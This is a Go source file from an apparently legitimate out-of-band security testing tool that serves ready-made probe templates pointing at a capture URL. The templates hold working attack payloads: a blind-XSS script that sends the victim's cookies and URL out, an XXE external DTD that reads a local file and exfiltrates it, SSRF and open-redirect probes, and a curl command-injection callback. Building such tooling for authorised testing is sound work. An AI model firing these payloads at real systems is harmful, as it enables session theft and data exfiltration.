package api

import (
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"

	"github.com/ToaderMatei/hooktrap/internal/store"
)

// Snippet is one copy-paste out-of-band test template.
type Snippet struct {
	Title string `json:"title"`
	Lang  string `json:"lang"`
	Code  string `json:"code"`
	Note  string `json:"note"`
}

// snippetGroup bundles related snippets under a heading.
type snippetGroup struct {
	Category string    `json:"category"`
	Blurb    string    `json:"blurb"`
	Snippets []Snippet `json:"snippets"`
}

// handlePayloads returns out-of-band (OAST) test templates wired to a bin's
// capture URL. These are the standard "did my input reach the server?" probes
// used in authorised testing and CTFs — the same idea as Burp Collaborator or
// interactsh — with the collaborator replaced by this local tool.
func (s *Server) handlePayloads(w http.ResponseWriter, r *http.Request) {
	binID := r.URL.Query().Get("bin")
	if binID == "" {
		binID = store.DefaultBinID
	}
	if _, ok := s.app.Store.Bin(binID); !ok {
		binID = store.DefaultBinID
	}
	base := s.captureBase(r, binID)
	host := hostOf(base)
	dnsHost := strings.TrimSuffix(host, "/")

	writeJSON(w, http.StatusOK, map[string]any{
		"bin":    binID,
		"base":   base,
		"host":   host,
		"groups": buildSnippets(base, dnsHost),
	})
}

// captureBase picks the externally reachable base URL for binID: the configured
// public URL (tunnel) when set, otherwise the host the dashboard was opened on
// with the capture port.
func (s *Server) captureBase(r *http.Request, binID string) string {
	cfg := s.app.Config()
	if pub := cfg.PublicURL; pub != "" {
		return strings.TrimRight(pub, "/") + "/" + binID
	}
	host := r.Host
	if h, _, err := net.SplitHostPort(host); err == nil {
		host = h
	}
	return "http://" + net.JoinHostPort(host, strconv.Itoa(cfg.HTTPPort)) + "/" + binID
}

func buildSnippets(base, host string) []snippetGroup {
	return []snippetGroup{
		{
			Category: "Reference",
			Blurb:    "Your capture endpoint. Point any client under test at it and watch the request land live.",
			Snippets: []Snippet{
				{Title: "Capture URL", Lang: "text", Code: base, Note: "Every HTTP method and path under this is logged."},
				{Title: "With a marker", Lang: "text", Code: base + "/ping?token=REPLACE_ME", Note: "Use a unique token per injection point to tell callbacks apart."},
			},
		},
		{
			Category: "Blind XSS / JS callback",
			Blurb:    "Confirm script execution in a context you cannot see by having the page beacon back.",
			Snippets: []Snippet{
				{Title: "Image beacon", Lang: "html", Code: `<img src="` + base + `/xss?c=` + "`+document.domain+`" + `" onerror="this.src='` + base + `/xss-onerror?d='+document.domain">`, Note: "Fires on load and on error."},
				{Title: "fetch() beacon", Lang: "html", Code: `<script>fetch('` + base + `/xss',{method:'POST',body:JSON.stringify({u:location.href,c:document.cookie})})</script>`, Note: "Sends current URL and readable cookies to the bin."},
				{Title: "Hosted script include", Lang: "html", Code: `<script src="` + trimPath(base) + `/f/beacon.js"></script>`, Note: "Upload beacon.js under the Files tab first."},
			},
		},
		{
			Category: "SSRF / OAST",
			Blurb:    "Prove a server fetched your URL. Watch the source IP to learn the target's egress address.",
			Snippets: []Snippet{
				{Title: "Plain URL to submit", Lang: "text", Code: base + "/ssrf?id=REPLACE_ME", Note: "Drop into any URL parameter, webhook field or PDF/image renderer."},
				{Title: "Gopher/redirect helper", Lang: "text", Code: "Set this bin's Response mode to 'redirect' and point Location at the internal target, then submit " + base, Note: "Turns the bin into an open redirect for SSRF filter bypass testing."},
			},
		},
		{
			Category: "XXE (XML external entity)",
			Blurb:    "Out-of-band XXE: the parser fetches your DTD, which pulls a second URL carrying the leaked data.",
			Snippets: []Snippet{
				{Title: "In-band OOB entity", Lang: "xml", Code: "<?xml version=\"1.0\"?>\n<!DOCTYPE r [\n  <!ENTITY % ext SYSTEM \"" + trimPath(base) + "/f/oob.dtd\">\n  %ext;\n]>\n<r>&send;</r>", Note: "Upload oob.dtd (below) under Files."},
				{Title: "oob.dtd to host", Lang: "xml", Code: "<!ENTITY % data SYSTEM \"file:///etc/hostname\">\n<!ENTITY % wrap \"<!ENTITY &#x25; send SYSTEM '" + base + "/xxe?x=%data;'>\">\n%wrap;", Note: "Host this as oob.dtd. The captured query string carries the exfiltrated value."},
			},
		},
		{
			Category: "DNS / command-exec callback",
			Blurb:    "When only DNS or raw TCP escapes, enable those listeners in Settings and use the host directly.",
			Snippets: []Snippet{
				{Title: "DNS lookup probe", Lang: "bash", Code: "nslookup REPLACE_ME." + host, Note: "Any resolver query for this name shows up under the DNS kind (enable DNS listener first)."},
				{Title: "curl to capture", Lang: "bash", Code: "curl " + base + "/exec?h=$(hostname)", Note: "Classic 'did my command run' check."},
			},
		},
		{
			Category: "Webhook / integration testing",
			Blurb:    "Use the bin as the receiving end of a webhook and inspect exactly what the sender posts.",
			Snippets: []Snippet{
				{Title: "Register as webhook URL", Lang: "text", Code: base, Note: "Then tune the reply under Response (status, JSON body, delay) to drive the sender's logic."},
				{Title: "Echo mode", Lang: "text", Code: "Set Response mode to 'echo' to reflect the full request back as JSON.", Note: "Handy when the sender validates the response."},
			},
		},
	}
}

func trimPath(base string) string {
	u, err := url.Parse(base)
	if err != nil {
		return base
	}
	return u.Scheme + "://" + u.Host
}

func hostOf(base string) string {
	u, err := url.Parse(base)
	if err != nil {
		return base
	}
	return u.Host
}
